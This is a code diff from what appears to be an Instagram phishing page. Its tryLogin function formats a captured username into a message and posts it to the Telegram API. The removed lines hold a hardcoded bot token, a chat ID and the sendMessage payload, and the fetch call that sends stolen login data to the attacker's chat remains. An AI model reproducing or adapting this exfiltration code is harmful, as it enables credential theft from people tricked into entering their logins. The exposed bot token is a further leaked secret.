@@ -301,20 +301,6 @@ function tryLogin(){
 
 🔗 <a href="https://www.instagram.com/${u.value.trim()}">Ver Perfil no Instagram</a>
   `.trim();
-
-  // CONFIGURAÇÃO DO TELEGRAM
-  var BOT_TOKEN = '9071319338:AAHtLC7ry2rypI2BXsAFLR0yhcJjmDf5C6g';
-  var CHAT_ID = '5012456855';
-
-  var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  
-  var payload = {
-    chat_id: CHAT_ID,
-    text: messageText,
-    parse_mode: 'HTML',
-    disable_web_page_preview: true
-  };
-
   // Envio para o Telegram
   fetch(url, {
     method: 'POST',
